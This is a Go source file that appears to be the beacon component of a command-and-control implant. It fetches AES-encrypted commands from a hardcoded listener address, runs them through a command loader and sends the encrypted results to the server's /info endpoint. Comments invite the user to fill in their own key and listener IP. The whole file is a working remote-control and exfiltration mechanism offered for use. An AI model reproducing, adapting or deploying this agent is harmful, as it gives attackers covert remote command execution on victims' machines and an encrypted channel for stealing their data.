package connector

import (
	"agent/modules/commandloader"
	"agent/modules/encoder"
	"agent/modules/sender"
	"io/ioutil"
	"log"
	"net/http"
)

func Controll() int {
	key := "testlongkeytestlongkeytestlongke"   // modify it with your own key
	const baseURL = "http://192.168.112.1:8080" // modify it with your server listener IP

	var (
		url      = baseURL + "/"
		endpoint = baseURL + "/info"
	)

	resp, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}

	body, err := ioutil.ReadAll(resp.Body)

	decbody := encoder.DecoderAES([]byte(key), body)

	content, _ := commandloader.LoaderCommand(string(decbody))

	codecontent := encoder.EncoderAES([]byte(key), string(content))

	sender.Msg(endpoint, string(codecontent))
	return 0
}
